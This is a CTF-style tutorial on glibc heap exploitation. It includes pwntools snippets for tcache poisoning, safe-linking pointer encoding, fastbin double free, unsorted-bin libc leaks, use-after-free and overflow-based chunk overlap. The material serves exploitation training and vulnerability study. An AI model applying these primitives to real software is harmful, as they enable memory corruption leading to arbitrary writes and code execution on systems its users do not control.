# Heap Exploitation Basics

## Standard Menu Template

Most CTF heap challenges expose a menu: alloc, free, edit, show. Wrap the IO once and reuse everywhere.
```python
from pwn import *
context.binary = elf = ELF('./binary')
libc = ELF('./libc.so.6')
p = process('./binary')

def alloc(idx, size, data=b'\n'):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b':', str(idx).encode())
    p.sendlineafter(b':', str(size).encode())
    p.sendafter(b':', data)

def free(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b':', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b':', str(idx).encode())
    p.sendafter(b':', data)

def show(idx):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b':', str(idx).encode())
    return p.recvuntil(b'\n', drop=True)
```
**Trap**: Adapt the menu selectors, delimiters, and index/size formats to the actual binary. Verify by running with `GDB` attached (`gdb.attach(p)`).

## glibc Heap Overview

- **Chunks**: Header (prev_size, size|flags) + user data. Minimum 0x20 bytes (64-bit).
- **Bins**:
  - **tcache**: Per-thread, up to 7 per size, singly-linked (glibc 2.26+).
  - **fastbin**: Singly-linked LIFO, sizes 0x20–0x80 (64-bit).
  - **unsorted bin**: Recently freed, any size, doubly-linked.
  - **small bins**: Doubly-linked, sizes < 0x400.
  - **large bins**: Doubly-linked + sorted, sizes ≥ 0x400.
- **Top chunk**: Extends into unmapped memory.

## Tcache Poisoning

**When**: Can write to a freed tcache chunk's `fd` pointer (UAF or overflow). glibc 2.26+.
```python
# IN: UAF/overflow on freed tcache chunk  OUT: arbitrary allocation at target_addr
edit(victim_idx, p64(target_addr))    # overwrite fd
alloc(_, size)                         # pops poisoned chunk
alloc(_, size)                         # returns target_addr — write payload here
```

### Safe-Linking (glibc 2.32+)

Tcache and fastbin `fd` pointers are XOR-obfuscated:
`fd_stored = fd_actual ^ (chunk_addr >> 12)`

```python
# To poison with safe-linking:
# Need to know the heap base (or the chunk's own address)
def encrypt_ptr(pos, ptr):
    return ptr ^ (pos >> 12)

target = ...
chunk_addr = ...  # address of the chunk being poisoned
edit(chunk_idx, p64(encrypt_ptr(chunk_addr, target)))
```

**Leak heap base**: Free two tcache chunks. The second chunk's `fd`
is `first_chunk ^ (second_chunk >> 12)`. If you can read it and
know one address, derive the other.

## Fastbin Dup (Double Free)

**When**: You can free the same chunk twice into the fastbin.
Pre-tcache or after tcache is full.

**How**: Free chunk A, free chunk B (different), free chunk A again.
Now the fastbin contains A → B → A. Allocate A, write a fake `fd`
pointing to target, allocate B, allocate A (returns A with fake fd),
allocate again (returns target).

```python
free(A)
free(B)  # prevent double-free detection (glibc checks head != chunk)
free(A)

alloc(size)  # returns A
edit(A, p64(target))

alloc(size)  # returns B
alloc(size)  # returns A again
alloc(size)  # returns target — arbitrary allocation
```

**glibc 2.29+**: tcache double-free detection via `key` field.
Bypass by corrupting the key field before second free.

## Unsorted Bin Leak

**When**: You can read a freed chunk's `fd` or `bk` pointer in the
unsorted bin.

**How**: Free a chunk large enough to go to unsorted bin (not tcache
or fastbin — size > 0x410 or fill tcache first). The `fd` and `bk`
point to `main_arena` in libc.

```python
# Free a large chunk (bypass tcache by filling it first)
for i in range(7):
    free(tcache_filler[i])
free(target_chunk)

# Read fd of freed chunk — it points to main_arena+offset
leak = read_chunk(target_chunk)
libc.address = leak - libc.sym['main_arena'] - 96  # offset varies
```

**Offsets**: The `fd` of an unsorted bin chunk points to
`main_arena + 0x60` (glibc 2.31) or similar. Calculate from
the libc you have.

## Use-After-Free (UAF)

**When**: A pointer is used after the memory is freed.

**How**: Free a chunk, allocate a new chunk of the same size
(reuses the freed memory), then use the original pointer to
read/write the new chunk's data.

```python
alloc(0x40)    # chunk at index 0
free(0)        # freed, but pointer still exists
alloc(0x40)    # new allocation at index 1, same memory
# Now index 0 and index 1 point to the same memory
# Write via index 1, read via index 0 (or vice versa)
```

## Heap Overflow

**When**: Writing past the end of a heap chunk into the next chunk.

**How**: Overwrite the next chunk's metadata (size field, fd/bk)
or its user data. Can corrupt size to create overlapping chunks
or poison freelist pointers.

### Overlapping Chunks via Size Corruption

```python
# Overwrite next chunk's size field to a larger value
# Free the corrupted chunk — it goes to a larger bin
# Allocate from that bin — get a chunk that overlaps the next
```

## Null Byte Overflow (Off-by-Null on Heap)

**When**: A null byte overwrites the LSB of the next chunk's size.

**How**: Clears the `PREV_IN_USE` bit and potentially shrinks
the size. On free, the allocator may consolidate with a "previous"
chunk that isn't actually free, creating overlapping chunks.

## Tools

```python
# pwndbg heap commands
heap                     # show heap state
bins                     # show all freelist bins
tcachebins               # tcache bins
fastbins                 # fastbin chains
vis_heap_chunks          # visual heap layout
find_fake_fast <addr>    # find valid fake fastbin chunks near addr
```
